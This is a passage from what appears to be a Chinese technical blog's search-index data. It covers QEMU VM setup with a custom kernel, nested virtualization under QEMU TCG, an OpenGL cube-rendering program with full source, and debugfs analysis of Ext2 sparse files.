   -cpu host \\    -m 8G \\    -smp 4 \\    -drive if=pflash,format=raw,readonly=on,file=/usr/share/OVMF/OVMF_CODE_4M.fd \\    -drive if=pflash,format=raw,file=/usr/share/OVMF/OVMF_VARS_4M.fd \\    -hda ubuntu-vm.qcow2 \\    -netdev user,id=net0,hostfwd=tcp::2222-:22 \\    -device e1000,netdev=net0 \\    -serial mon:stdio \\    -display none\n再次观察上述 QEMU 启动参数，我使用 -netdev user 指定使用用户模式网络，虚拟机能够直接通过宿主机来访问互联网。同时还通过 hostfwd=tcp::2222-:22 设置了端口转发，把宿主机的 TCP 2222 端口转发到虚拟机的 22 端口，宿主机可以通过 ssh 工具连接到虚拟机：\nssh -p 2222 &lt;用户名&gt;@localhost\n同理，宿主机要想传输文件到虚拟机，也可以通过：\nscp -P 2222 &lt;要传输的文件&gt; &lt;用户名&gt;@localhost:&lt;目录&gt;\n而虚拟机要想传输文件回宿主机，可以先为宿主机启用 ssh 服务（如果没有启用的话）：\nsudo apt updatesudo apt install openssh-server# 启用 ssh 服务sudo systemctl start ssh# 设置开机自动启动sudo systemctl enable ssh# 检查 ssh 服务运行状态sudo systemctl status ssh\n此后，虚拟机也可以直接通过 scp 向宿主机进行文件传输（无 -P 2222）：\nscp &lt;要传输的文件&gt; &lt;用户名&gt;@10.0.2.2:&lt;目录&gt;\n使用自己编译的内核如果只是进行应用程序的开发和测试的话，想必上面的环境已经够用了。但我毕竟是做操作系统相关工作的，难免要对内核代码进行修改并编译测试，因此这就涉及到另一个问题：如何在保留发行版丰富的开发环境的同时，使用自己编译的内核？这一块踩了不少坑，下面直接介绍完整流程：\n首先需要编译自己的内核，得到 bzImage，这一块想必不用再介绍了。\n然后是需要在内核源代码目录下生成和内核版本对应的 initramfs，得到文件 initrd.img-5.10.0：\n(py312) lordaeronesz@Snow:~/LWS/510-linux$ sudo mkinitramfs -o ./initrd.img-5.10.0 5.10.0W: Kernel configuration /boot/config-5.10.0 is missing, cannot check for zstd compression support (CONFIG_RD_ZSTD)W: missing /lib/modules/5.10.0W: Ensure all necessary drivers are built into the linux image!depmod: ERROR: could not open directory /lib/modules/5.10.0: No such file or directorydepmod: FATAL: could not search modules: No such file or directory/usr/sbin/mkinitramfs: 136: linux-version: not foundI: The initramfs will attempt to resume from /dev/sdbI: (UUID=f10066eb-414e-4970-a3c9-9a28c963f849)I: Set the RESUME variable to override this.cat: /var/tmp/mkinitramfs_mpVlsQ/lib/modules/5.10.0/modules.builtin: No such file or directorydepmod: WARNING: could not open modules.order at /var/tmp/mkinitramfs_mpVlsQ/lib/modules/5.10.0: No such file or directorydepmod: WARNING: could not open modules.builtin at /var/tmp/mkinitramfs_mpVlsQ/lib/modules/5.10.0: No such file or directorydepmod: WARNING: could not open modules.builtin.modinfo at /var/tmp/mkinitramfs_mpVlsQ/lib/modules/5.10.0: No such file or directory\n\n看到上面这么多警告信息我还以为失败了，似乎是因为没有指定内核模块的缘故，这一块先不琢磨了，能得到 initrd 就行。\n\n由于后面要在 QEMU 启动参数中添加传递给内核的 cmdline，因此我们必须确定该发行版下根目录对应的是哪个设备目录，这里要先用 运行系统 章节介绍的启动参数启动 Ubuntu 自带的内核，查看 df -h：\nlordaeronesz@flame:~$ df -hFilesystem                         Size  Used Avail Use% Mounted ontmpfs                              794M 1004K  793M   1% /runefivarfs                           256K  110K  142K  44% /sys/firmware/efi/efivars/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.5G  3.8G  60% /tmpfs                              3.9G     0  3.9G   0% /dev/shmtmpfs                              5.0M     0  5.0M   0% /run/locktmpfs                              3.9G     0  3.9G   0% /run/qemu/dev/sda2                          1.7G  101M  1.5G   7% /boot/dev/sda1                          952M  6.2M  945M   1% /boot/efitmpfs                              794M   16K  794M   1% /run/user/1000\n可以看到，根目录的对应的设备目录为 /dev/mapper/ubuntu--vg-ubuntu--lv，之所这么奇怪而不是类似 sda 这种似乎是使用了 LVM（Logical Volume Manager） 的缘故。\n最后，在 QEMU 启动参数中指定我们上面得到的 initrd、kernel、root。完整的启动参数如下：\nqemu-system-x86_64 \\    -machine q35,accel=kvm \\    -cpu host \\    -m 8G \\    -smp 4 \\    -kernel bzImage \\    -initrd initrd.img-5.10.0 \\    -drive if=pflash,format=raw,readonly=on,file=/usr/share/OVMF/OVMF_CODE_4M.fd \\    -drive if=pflash,format=raw,file=/usr/share/OVMF/OVMF_VARS_4M.fd \\    -append &quot;root=/dev/mapper/ubuntu--vg-ubuntu--lv console=ttyS0&quot; \\    -hda ubuntu-vm.qcow2 \\    -netdev user,id=net0,hostfwd=tcp::2222-:22 \\    -device e1000,netdev=net0 \\    -serial mon:stdio \\    -display none\n成功启动后，通过 uname -a 查看内核信息：\nlordaeronesz@flame:~$ uname -aLinux flame 5.10.0+ #58 SMP Thu Oct 30 19:18:14 CST 2025 x86_64 x86_64 x86_64 GNU/Linux\n可以看到，内核为我自行编译的 5.10 版本，而非自带的 6.8 版本：\nlordaeronesz@flame:~$ uname -aLinux flame 6.8.0-87-generic #88-Ubuntu SMP PREEMPT_DYNAMIC Sat Oct 11 09:28:41 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux\n\n说实话，我对操作系统启动这一块的内容不太熟悉，对 initrd、initramfs 等这些名词有些一知半解，所以这一块的配置才踩了那么多坑🥲。在此立个 flag，这部分内容等后续找个时间深入研究一下，再整理成博客。\n\n","categories":["操作系统"],"tags":["操作系统","经验","虚拟化"]},{"title":"使用QEMU TCG模拟一个硬件虚拟化环境","url":"/2025/09/07/%E4%BD%BF%E7%94%A8QEMU%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%A8%A1%E6%8B%9F%E4%B8%80%E4%B8%AA%E7%A1%AC%E4%BB%B6%E8%99%9A%E6%8B%9F%E5%8C%96%E7%8E%AF%E5%A2%83/","content":"本文将介绍如何使用 QEMU TCG 模拟的方式，构建一个支持硬件虚拟化的环境，使得能够在该模拟器环境下启动一个 KVM 虚拟机。\n\n编译最新 QEMU首先需要下载并编译 QEMU，我们以 x86_64 架构为例，QEMU 选择使用最新版本。\n# 下载最新仓库$ git clone https://git.qemu-project.org/qemu.git$ cd qemu# 配置编译目标$ ./configure --target-list=x86_64-softmmu# 编译$ make -j$(nproc)\n准备 Linux 内核（选用 6.12.0）接下来，需要准备 Linux 内核，我这里选用的是 6.12.0 版本。硬件虚拟化技术使用 AMD-V，需要在 menuconfig 中启用 KVM for AMD processor support。\n# 下载 6.12 版本内核$ wget https://cdn.kernel.org/pub/linux/kernel/v6.x/linux-6.12.tar.xz$ tar -xvf linux-6.12.tar.xz# 配置选项$ cd linux-6.12$ make ARCH=x86_64 defconfig$ make menuconfig# Virtualization#   -&gt; Kernel-based Virtual Machine (KVM) support#        -&gt; KVM for AMD processors support# 编译$ make -j$(nproc)\n\n注意，在启用指定的 menuconfig 选项时，建议标记为 Y 直接包含进内核中，而非标记为 M 以模块形式动态加载。 \n\n准备根文件系统（基于 Buildroot）有了 QEMU 和 Linux 内核，还需要有根文件系统，才能够正常工作。这里我使用的是 Buildroot，只需要简单的配置，它就能够自动化构建一个根文件系统。\n# 下载 buildroothttps://buildroot.org/download.html# 配置选项$ make menuconfig# Target options#   -&gt; Target Architecture (i386)#        -&gt; (X) x86_64# Filesystem images#   -&gt; [*] ext2/3/4 root filesystem# 编译$ make -j$(nproc)\nBuildroot 构建过程涉及联网下载对应的软件包，如果网络超时的情况，可以 ^c 中断，make clean 后再重新编译。\n\n在 WSL2 环境下构建时，由于 PATH 环境变量包含了 Windows 下的某些软件，因此可能导致无法编译：\nYour PATH contains spaces, TABs, and/or newline (\\n) characters. This doesn&#x27;t work. Fix you PATH.\n此时可以使用命令 export PATH=$(echo &quot;$PATH&quot; | tr -d &#39; \\t\\n&#39;) 暂时将 PATH 路径的空格去除，再重新编译。\n\n模拟器启动参数上述编译都完成后，将得到的内核 bzImage （位于 arch/x86/boot/bzImage）和根文件系统 rootfs.ext2 （位于 output/images/rootfs.ext2）拷贝到同一目录下。\nQEMU 启动脚本示例如下所示：\n/your_path_of_qemu/build/qemu-system-x86_64 \\    -machine q35,accel=tcg \\    -cpu EPYC-v4,+svm \\    -m 8G \\    -smp 4 \\    -kernel bzImage \\    -append &quot;rootwait root=/dev/vda ro console=ttyS0&quot; \\    -drive file=rootfs.ext2,format=raw,id=hd0,if=none \\    -device virtio-blk-pci,drive=hd0 \\    -nographic \\\nKVM 虚拟机测试在完成了虚拟化环境的构建后，便可以开始测试了。这里参考 100 行 C 代码创建一个 KVM 虚拟机，以很少的代码量构建一个最小的 hypervisor。\n将 kvm-vmm 和 guest 在本地编译好后放入 rootfs.ext2 中，启动模拟器运行，结果如下图所示：\n\n\n在该模拟器中运行一个完整的 QEMU/KVM 虚拟机理论也是可行的，但是我使用的 buildroot 生成的根文件系统缺乏 QEMU 运行所需的完整的动态链接库。\n静态编译 QEMU 是一种选择，但是也比较繁琐，需要为本机准备大量的静态库，在此没有进行测试。\n\n","categories":["操作系统"],"tags":["操作系统","经验","虚拟化"]},{"title":"使用OpenGL渲染一个立方体","url":"/2022/01/19/%E4%BD%BF%E7%94%A8OpenGL%E6%B8%B2%E6%9F%93%E4%B8%80%E4%B8%AA%E7%AB%8B%E6%96%B9%E4%BD%93/","content":"本文将介绍如何使用最为常用的图形 API —— OpenGL 来渲染一个立方体，代码部分来自于《Computer Graphics Programming in OpenGL with C++》，并加入了自己的理解。\n\n基本过程环境配置在编写程序之前，需要先配置好一些有助于程序编写的第三方库，本次实验需要用到的库有三个：用于窗口管理的 GLFW 库，扩展功能的 GLEW 库，以及用于数学运算的 GLM 库。\nIDE 使用的是 Visual Studio 2019，并安装了 GLSL Language Integration 插件来实现 glsl 语言的代码高亮和自动补全。\n具体的环境配置过程在此不过多赘述，本文主要聚焦于代码的实现。\n窗口的创建要将渲染的图像显示出来，就需要创建一个特定的显示窗口，首先通过 glfwWindowHint() 指定 OpenGL 的版本号，再使用 glfwCreateWindow() 创建 GLFW 窗口。由于创建 GLFW 窗口并不会自动将它与当前 OpenGL 上下文关联起来，因此还需要调用 glfwMakeContextCurrent().\n为了防止画面撕裂的发生，我们通常需要使用 glfwSwapInterval() 来开启垂直同步（Vsync）。 \n同时，在图形渲染的循环语句中，还需要加入 glfwSwapBuffers() 来绘制屏幕，加入 glfwPollEvents() 来处理窗口相关事件，包括最小化、关闭、拉伸等操作。\n程序初始化创建 Shader 对象首先使用 glCreateShader（） 创建一个 Shader 对象，并通过枚举类型 shaderType 指定 Shader 类型（GL_VERTEX_SHADER 或者 GL_FRAGMENT_SHADER），再使用 glShaderSource（）;，利用 string 来替换 shader 对象的源代码，此处的 string 可以直接硬编码于 C++ 程序中，但在代码量较多时硬编码显然不合适，应该将其编码于一个专门的 glsl 文件中，并使用 C++ 的文件输入流 ifstream进行读取操作。\n编译 Shader 对象在得到了包含源代码的 Shader 对象后，就需要将其编译了，编译使用 glCompileShader（）. 由于 Shader 是运行在 GPU 上的代码，因此当编译出错时 C++ 程序也不会崩溃，只是无法正常输出，因此这里我们可以使用 glGetShaderiv（） 获取 shader 的编译状态(GL_COMPILE_STATUS)，若编译出错则输出错误信息。\n创建并链接 program 对象最后创建 program 对象，使用 glCreateProgram（） . 并使用 glAttachShader（）, 将之前创建的 Shader 对象附加到 program 上，使用 glLinkProgram（） 链接 program 对象，链接过程同样可能失败，因此可通过 glGetProgramiv（） 获取链接状态。\n创建并激活 VAO 与 VBOVBO 是顶点缓冲对象（Vertex Buffer Object），里面存储了一系列图形数据，包括顶点坐标等，一个场景通常需要多个 VBO. 而 VAO 是顶点数组对象（Vertex Array Object），它是一种组织缓冲区的方法，在此项目中只需要一个。\nVBO 使用 glGenBuffers() 创建，使用 glBindBuffers() 激活；VAO 使用 glGenVertexArrays() 创建，使用 glBindVertexArrays() 激活。一个立方体包含 36 个顶点（一个立方体由 12 个三角形组成），这里直接由数组给出，并使用 glBufferData() 将顶点坐标传递给缓冲区。\n渲染过程渲染过程在程序开始后将会不断执行，每一次执行都将刷新当前显示的内容，调用渲染过程的频率也就是帧数。\n启用 program 对象首先需要先使用 glClear() 清除深度缓冲区，否则在进行隐藏面消除时可能会使得每个曲面都被移除从而导致黑屏，再调用 glUseProgram() 来启用 program 对象。\n构建矩阵要将一个三维物体准确地渲染到屏幕，通常需要使用透视矩阵、模型矩阵、视图矩阵对坐标点进行变换。\n首先是透视矩阵（proj_matrix），GLM 库中包含了一个用于构建透视矩阵的函数 glm::perspective()，参数需要纵横比、视场（FOV）、近剪裁平面的距离、远剪裁平面的距离。需要注意的是，此处的 FOV 单位是弧度。\n其次是模型矩阵和视图矩阵，通常我们将这两个矩阵合并成为模型-视图矩阵（mv_matrix）。模型矩阵为一个平移 (cubeLocX, cubeLocY, cubeLocZ) 的平移矩阵，视图矩阵为一个平移 (-cameraX, -cameraY, -cameraZ) 的平移矩阵，都可以使用 glm::translate() 构造。\n将矩阵复制给统一变量统一变量在 Shader 代码中使用 uniform 关键字声明，是一系列顶点的一个统一的属性。\n首先使用 glGetUniformLocation() 获取 Shader 中统一变量的引用，再使用 glUniformMatrix4fv() 将上一步构建的矩阵复制给统一变量。 \nShader 在获取到变换矩阵之后，便计算得到渲染时每个点的实际位置，这个变量在 OpenGL 中已经预先定义，名为 gl_Position，可得 gl_Position = proj_matrix * mv_matrix * vec4(position, 1.0)，此处的 postion 为立方体预期的顶点坐标，在下一步中将会传入。\n将 VBO 关联给顶点属性首先激活特定的 VBO，再使用 glVertexAttribPointer() 将 VBO 中的数据传送给每一个顶点的顶点着色器的特定变量，这个变量根据 layout (location = n) 来指定 n 号位置。\n同时，这里还需要使用 glEnableVertexAttribArray() 来启用此 n 号位置的变量。 \n顶点属性插值顶点着色器输出的变换过后的顶点坐标 gl_Position 到达光栅着色器并光栅化之后，片段的具体像素位置到达片段着色器，并使用片段着色器中输出的颜色属性进行着色。\n绘制模型最终，使用 glDrawArrays() 绘制模型，图元类型选择三角形（GL_TRIANGLES）.\n效果展示\n源代码main.cpp#define GLEW_STATIC#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;fstream&gt;#include&lt;cmath&gt;#include&lt;glm/glm.hpp&gt;#include&lt;glm/gtc/type_ptr.hpp&gt;#include&lt;glm/gtc/matrix_transform.hpp&gt;#include&lt;GL/glew.h&gt;#include&lt;GLFW/glfw3.h&gt;#include&quot;Utils.h&quot;using namespace std;#define numVAOs 1#define numVBOs 2float cameraX, cameraY, cameraZ;float cubeLocX, cubeLocY, cubeLocZ;GLuint renderingProgram;GLuint vao[numVAOs];GLuint vbo[numVBOs];GLuint mvLoc, projLoc;int width, height;float aspect;glm::mat4 pMat, vMat, mMat, mvMat;void setupVertices() &#123;\tfloat vertexPositions[108] = &#123;\t\t-1.0f, 1.0f, -1.0f, -1.0f, -1.0f, -1.0f, 1.0f, -1.0f, -1.0f,\t\t1.0f, -1.0f, -1.0f, 1.0f, 1.0f, -1.0f, -1.0f, 1.0f, -1.0f,\t\t1.0f, -1.0f, -1.0f, 1.0f, -1.0f, 1.0f, 1.0f, 1.0f, -1.0f,\t\t1.0f, -1.0f, 1.0f, 1.0f, 1.0f, 1.0f, 1.0f, 1.0f, -1.0f,\t\t1.0f, -1.0f, 1.0f, -1.0f, -1.0f, 1.0f, 1.0f, 1.0f, 1.0f,\t\t-1.0f, -1.0f, 1.0f, -1.0f, 1.0f, 1.0f, 1.0f, 1.0f, 1.0f,\t\t-1.0f, -1.0f, 1.0f, -1.0f, -1.0f, -1.0f, -1.0f, 1.0f, 1.0f,\t\t-1.0f, -1.0f, -1.0f, -1.0f, 1.0f, -1.0f, -1.0f, 1.0f, 1.0f,\t\t-1.0f, -1.0f, 1.0f, 1.0f, -1.0f, 1.0f, 1.0f, -1.0f, -1.0f,\t\t1.0f, -1.0f, -1.0f, -1.0f, -1.0f, -1.0f, -1.0f, -1.0f, 1.0f,\t\t-1.0f, 1.0f, -1.0f, 1.0f, 1.0f, -1.0f, 1.0f, 1.0f, 1.0f,\t\t1.0f, 1.0f, 1.0f, -1.0f, 1.0f, 1.0f, -1.0f, 1.0f, -1.0f,\t&#125;;\tglGenVertexArrays(numVAOs, vao);\tglBindVertexArray(vao[0]);\tglGenBuffers(numVBOs, vbo);\tglBindBuffer(GL_ARRAY_BUFFER, vbo[0]);\tglBufferData(GL_ARRAY_BUFFER, sizeof(vertexPositions), vertexPositions, GL_STATIC_DRAW);&#125;void init(GLFWwindow* window) &#123;\trenderingProgram = createShaderProgram();\tcameraX = 0.0f; cameraY = 0.0f; cameraZ = 8.0f;\tcubeLocX = 0.0f; cubeLocY = -2.0f; cubeLocZ = 0.0f; // 沿 Y 轴下移以展示透视\tsetupVertices();&#125;void display(GLFWwindow* window, double currentTime) &#123;\tglClear(GL_DEPTH_BUFFER_BIT);\tglUseProgram(renderingProgram);\t\t// 获取 MV 矩阵和投影矩阵的统一变量\tmvLoc = glGetUniformLocation(renderingProgram, &quot;mv_matrix&quot;);\tprojLoc = glGetUniformLocation(renderingProgram, &quot;proj_matrix&quot;);\t// 构建透视矩阵\tglfwGetFramebufferSize(window, &amp;width, &amp;height);\taspect = (float)width / (float)height;\tpMat = glm::perspective(1.0472f, aspect, 0.1f, 1000.0f); // 1.0472 radians = 60 degrees\t// 构建视图矩阵、模型矩阵和视图-模型矩阵\tvMat = glm::translate(glm::mat4(1.0f), glm::vec3(-cameraX, -cameraY, -cameraZ));\tmMat = glm::translate(glm::mat4(1.0f), glm::vec3(cubeLocX, cubeLocY, cubeLocZ));\tmvMat = vMat * mMat;\t// 将透视矩阵和 MV 矩阵复制给相应的统一变量\tglUniformMatrix4fv(mvLoc, 1, GL_FALSE, glm::value_ptr(mvMat));\tglUniformMatrix4fv(projLoc, 1, GL_FALSE, glm::value_ptr(pMat));\t// 将 VBO 关联给顶点着色器中相应的顶点属性\tglBindBuffer(GL_ARRAY_BUFFER, vbo[0]);\tglVertexAttribPointer(0, 3, GL_FLOAT, GL_FALSE, 0, 0);\tglEnableVertexAttribArray(0);\t// 调整 OpenGL 位置，绘制模型\tglEnable(GL_DEPTH_TEST);\tglDepthFunc(GL_LEQUAL);\tglDrawArrays(GL_TRIANGLES, 0, 36);&#125;int main() &#123;\tif (!glfwInit()) &#123;\t\texit(EXIT_FAILURE);\t&#125;\tglfwWindowHint(GLFW_CONTEXT_VERSION_MAJOR, 4);\tglfwWindowHint(GLFW_CONTEXT_VERSION_MINOR, 3);\tGLFWwindow* window = glfwCreateWindow(600, 600, &quot;Chapter2 - program1&quot;, NULL, NULL);\tglfwMakeContextCurrent(window);\tif (glewInit() != GLEW_OK) &#123;\t\texit(EXIT_FAILURE);\t&#125;\tglfwSwapInterval(1);\tinit(window);\twhile (!glfwWindowShouldClose(window)) &#123;\t\tdisplay(window, glfwGetTime());\t\tglfwSwapBuffers(window);\t\tglfwPollEvents();\t&#125;\tglfwDestroyWindow(window);\tglfwTerminate();\texit(EXIT_SUCCESS);&#125;\nUtils.h#pragma once#include&lt;string&gt;#include&lt;GLFW/glfw3.h&gt;using namespace std;GLuint createShaderProgram();string readShaderSource(const char* filePath);void printShaderLog(GLuint shader);void printProgramLog(int prog);bool checkOpenGLError();\nUtils.cpp#define GLEW_STATIC#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;fstream&gt;#include&lt;GL/glew.h&gt;#include&lt;GLFW/glfw3.h&gt;#include&quot;Utils.h&quot;string readShaderSource(const char* filePath) &#123;\tstring content;\tifstream fileStream(filePath, ios::in);\tstring line = &quot;&quot;;\twhile (!fileStream.eof()) &#123;\t\tgetline(fileStream, line);\t\tcontent.append(line + &quot;\\n&quot;);\t&#125;\tfileStream.close();\treturn content;&#125;GLuint createShaderProgram() &#123;\tstring vertShaderStr = readShaderSource(&quot;vertShader.glsl&quot;);\tstring fragShaderStr = readShaderSource(&quot;fragShader.glsl&quot;);\tconst char* vshaderSource = vertShaderStr.c_str();\tconst char* fshaderSource = fragShaderStr.c_str();\tGLint vertCompiled;\tGLint fragCompiled;\tGLint linked;\tGLuint vShader = glCreateShader(GL_VERTEX_SHADER);\tGLuint fShader = glCreateShader(GL_FRAGMENT_SHADER);\tglShaderSource(vShader, 1, &amp;vshaderSource, NULL);\tglShaderSource(fShader, 1, &amp;fshaderSource, NULL);\t\t// 捕获编译着色器时的错误 \tglCompileShader(vShader);\tcheckOpenGLError();\tglGetShaderiv(vShader, GL_COMPILE_STATUS, &amp;vertCompiled);\tif (vertCompiled != 1) &#123;\t\tcout &lt;&lt; &quot;vertex compilation failed&quot; &lt;&lt; endl;\t\tprintShaderLog(vShader);\t&#125;\t\tglCompileShader(fShader);\tcheckOpenGLError();\tglGetShaderiv(fShader, GL_COMPILE_STATUS, &amp;fragCompiled);\tif (fragCompiled != 1) &#123;\t\tcout &lt;&lt; &quot;fragment compilation failed&quot; &lt;&lt; endl;\t\tprintShaderLog(fShader);\t&#125;\t// 捕获链接着色器时的错误\tGLuint vfProgram = glCreateProgram();\tglAttachShader(vfProgram, vShader);\tglAttachShader(vfProgram, fShader);\tglLinkProgram(vfProgram);\tcheckOpenGLError();\tglGetProgramiv(vfProgram, GL_LINK_STATUS, &amp;linked);\tif (linked != 1) &#123;\t\tcout &lt;&lt; &quot;linked failed&quot; &lt;&lt; endl;\t\tprintProgramLog(vfProgram);\t&#125;\treturn vfProgram;&#125;void printShaderLog(GLuint shader) &#123;\tint len = 0;\tint chWritten = 0;\tchar* log;\tglGetShaderiv(shader, GL_INFO_LOG_LENGTH, &amp;len);\tif (len &gt; 0) &#123;\t\tlog = (char*)malloc(len);\t\tglGetShaderInfoLog(shader, len, &amp;chWritten, log);\t\tcout &lt;&lt; &quot;Shader Info Log: &quot; &lt;&lt; log &lt;&lt; endl;\t\tfree(log);\t&#125;&#125;void printProgramLog(int prog) &#123;\tint len = 0;\tint chWritten = 0;\tchar* log;\tglGetProgramiv(prog, GL_INFO_LOG_LENGTH, &amp;len);\tif (len &gt; 0) &#123;\t\tlog = (char*)malloc(len);\t\tglGetProgramInfoLog(prog, len, &amp;chWritten, log);\t\tcout &lt;&lt; &quot;Program Info Log: &quot; &lt;&lt; log &lt;&lt; endl;\t\tfree(log);\t&#125;&#125;bool checkOpenGLError() &#123;\tbool foundError = false;\tint glErr = glGetError();\twhile (glErr != GL_NO_ERROR) &#123;\t\tcout &lt;&lt; &quot;glError: &quot; &lt;&lt; glErr &lt;&lt; endl;\t\tfoundError = true;\t\tglErr = glGetError();\t&#125;\treturn foundError;&#125;\nfragShader.glsl# version 430out vec4 color;uniform mat4 mv_matrix;uniform mat4 proj_matrix;void main() &#123;\tcolor = vec4(0.47, 0.93, 1.0, 1.0);&#125;\nvertShader.glsl#version 430layout (location = 0) in vec3 position;uniform mat4 mv_matrix;uniform mat4 proj_matrix;void main()&#123;\tgl_Position = proj_matrix * mv_matrix * vec4(position, 1.0);&#125;\n","categories":["计算机图形学"],"tags":["C++","OpenGL","计算机图形学"]},{"title":"使用debugfs分析Ext2下的稀疏文件","url":"/2025/12/27/%E4%BD%BF%E7%94%A8debugfs%E5%88%86%E6%9E%90Ext2%E4%B8%8B%E7%9A%84%E7%A8%80%E7%96%8F%E6%96%87%E4%BB%B6/","content":"本文将介绍 Ext2 文件系统下的稀疏文件表示，并使用 debugfs 对其进行分析。\n\n环境准备# 创建一个 2G 大小的 Ext2 磁盘镜像文件dd if=/dev/zero of=ext2.img bs=1M count=2048# 生成一个 8M 大小的全零文件（非稀疏）dd if=/dev/zero of=8M.zero bs=1M count=8# 创建一个 8M 大小的 Ext2 格式化的镜像文件（稀疏）cp 8M.zero 8M.ext2mkfs.ext2 -F 8M.ext2# 将两个 8M 大小的文件拷入 ext2.img 中mkdir -p tmpsudo mount ext2.img tmpsudo cp 8M.zero tmpsudo cp 8M.ext2 tmpumount tmp\n稀疏文件的本质稀疏文件即一个文件的起始位置到结束位置之间存在“空洞”（如下图所示），所谓空洞，就是该文件区域没有被分配任何的磁盘空间，体现在 Ext2 文件系统元数据的层面就是——对应的数据块指针为空。\n\n更形式化的描述为：只要一个文件在逻辑地址空间中存在至少一个由文件系统明确标记、且未分配物理数据块的连续“空洞”区域，该文件就可以被称为稀疏文件。\n当应用层对稀疏文件的稀疏块进行读取时，文件系统通常的选择是：不进行任何的磁盘读取，而是直接返回一个用 0 填充的数据块。\n稀疏文件分析文件系统基本信息首先使用 debugfs ext2.img 进入对该 Ext2 磁盘镜像文件的调试模式：\n$ debugfs ext2.imgdebugfs 1.47.0 (5-Feb-2023)debugfs:\n在 debugfs 的交互式终端中使用 ls 打印稀疏文件 8M.ext2 的基本信息：\n12  100644 (1)      0      0   8388608 26-Dec-2025 16:35 8M.ext213  100644 (1)      0      0   8388608 26-Dec-2025 16:35 8M.zero\n其中，inode 号为 12，文件大小为 8388608 字节（8MB）。\ninode 详细信息输入 stat &lt;12&gt; 对 inode 号为 12 的文件进行具体分析，得到以下信息：\nInode: 12   Type: regular    Mode:  0644   Flags: 0x0Generation: 4091734916    Version: 0x00000000:00000001User:     0   Group:     0   Project:     0   Size: 8388608File ACL: 0Links: 1   Blockcount: 240Fragment:  Address: 0    Number: 0  Size: 0ctime: 0x694e48d1:9e2ccd54 -- Fri Dec 26 16:35:29 2025atime: 0x694e48d1:9bbec8b0 -- Fri Dec 26 16:35:29 2025mtime: 0x694e48d1:9e2ccd54 -- Fri Dec 26 16:35:29 2025crtime: 0x694e48d1:9bbec8b0 -- Fri Dec 26 16:35:29 2025Size of extra inode fields: 32BLOCKS:(0-4):17920-17924, (IND):650, (132-137):3972-3977, (DIND):651, (IND):652, (2032-2047):20464-20479TOTAL: 30\n其中的一些关键信息为：Blockcount（以 512B 为单位）为 240，即文件实际占用了 120KB 的磁盘空间；BLOCKS（以 BLOCK_SIZE 为单位，通常为 4KB）为 30，刚好与 Blockcount 的值对应。\n尤其需要关注的是数据块指针的分布：\n\n直接块（0-4）：17920、17921、17922、17923、17924\n间接块（IND）：650 → 指向块 132-137（3972-3977）\n二级间接块（DIND）：651 → 指向间接块 652\n间接块（IND）：652 → 指向块 2032-2047（20464-20479）\n\n总结，文件的所有逻辑块为 0-2047，即逻辑大小为 2048 * 4KB = 8MB，其中逻辑块 5-131、138-2031 没有被分配任何磁盘块，也就是所谓的稀疏文件的“空洞”。\n间接块内容分析接下来可以退出 debugfs 终端，直接对 ext2.img 的数据块内容进行分析。\n首先可以验证一下间接块的一致性，使用下列命令打印指定 650 号磁盘块的内容：\ndd if=ext2.img bs=4096 skip=650 count=1 2&gt;/dev/null | hexdump -C | head -20\n输出如下所示：\n00000000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|*000001e0  84 0f 00 00 85 0f 00 00  86 0f 00 00 87 0f 00 00  |................|000001f0  88 0f 00 00 89 0f 00 00  00 00 00 00 00 00 00 00  |................|\n由于每个数据块指针占 4B 大小，且 Ext2 文件系统中的直接块数量为 12，因此 0x1e0（十进制表示 480） 对应的磁盘块号为 $480 / 4 + 12 = 132$，且该处的数据块指针为 0x00000f84（小端序），对应的十进制正好为 3972，与上一小节中 stat &lt;12&gt; 得到的数据一致，后面的 3973, 3974, … 也是同理。\n\n间接块（IND）：650 → 指向块 132-137（3972-3977）\n\n二级间接块也可以采用相同的验证方式，只不过多了一层间接层，在此就不再具体分析了。\n数据块位图分析Ext2 文件系统中引入了块组的概念，每个块组有自己独立的 inode 位图和数据块位图。我们再次使用 debugfs 对 ext2.img 进行调试。首先使用 stats 命令打印文件系统的总体元数据信息，由于我们通过 stat 8M.ext2 已经看到了该文件位于块组 0 中，因此我们主要关注块组 0 的元数据信息：\n...  Group  0: block bitmap at 129, inode bitmap at 130, inode table at 131           3544 free blocks, 8179 free inodes, 2 used directories...\n可以看到，其数据块位图位于 129 块。我们可以采用和分析间接块时一样的方式，打印该块的数据：\ndd if=ext2.img bs=4096 skip=129 count=1 2&gt;/dev/null | hexdump -C\n输出如下所示：\n...*000008b0  ff ff ff ff ff ff ff ff  ff ff ff 01 00 00 00 00  |................|000008c0  1f 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|000008d0  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|*...\n我们可以验证一下直接索引所指向的数据块（17920-17924）的位图分配情况，其对应的上述地址应为 $17920 / 8 = 2240$，对应的十六进制为 0x8c0，可以看到为 1f，即连续的 5 个 1，完美匹配。\n对比非稀疏文件使用 stat &lt;13&gt; 打印 8M.zero 的文件信息，如下所示：\nInode: 13   Type: regular    Mode:  0644   Flags: 0x0Size: 8388608Blockcount: 16408BLOCKS:(0-11):3584-3595, (IND):649, ... (2051个块)\n计算得到 $16408 * 512 = 8400896$，由于 Blockcount 中将数据块指针也包含在其中，因此文件实际所占用的磁盘空间甚至要大于文件大小（8388608B, 8M），与稀疏文件 8M.ext2 仅占用 120KB 空间形成鲜明对比。\n参考资料\n【linux学习指南】Ext系列文件系统(三) ext2 文件系统的认识与构成-腾讯云开发者社区-腾讯云\nSparse file - ArchWiki\nfilesystems - What is a sparse file and why do we need it? - Stack Overflow\n\n","categories":["操作系统"],"tags":["操作系统","经验","文件系统"]},{"title":"动态前缀和数组：树状数组","url":"/2024/03/03/%E5%8A%A8%E6%80%81%E5%89%8D%E7%BC%80%E5%92%8C%E6%95%B0%E7%BB%84%EF%BC%9A%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/","content":"前缀和的不足前缀和是一种常见的算法思想，能够实现在常数时间复杂度下得到某个子区间内所有元素和。以一维数组 nums 为例，定义前缀和数组 preSum，preSum[i] 表示 nums 前 i 个元素的和，利用动态规划的思想，易得 preSum[i] = preSum[i - 1] + nums[i] 的递推关系，因此构造一个前缀和数组的时间复杂度为 O(n)，而查询前 i 个元素的和只需查询 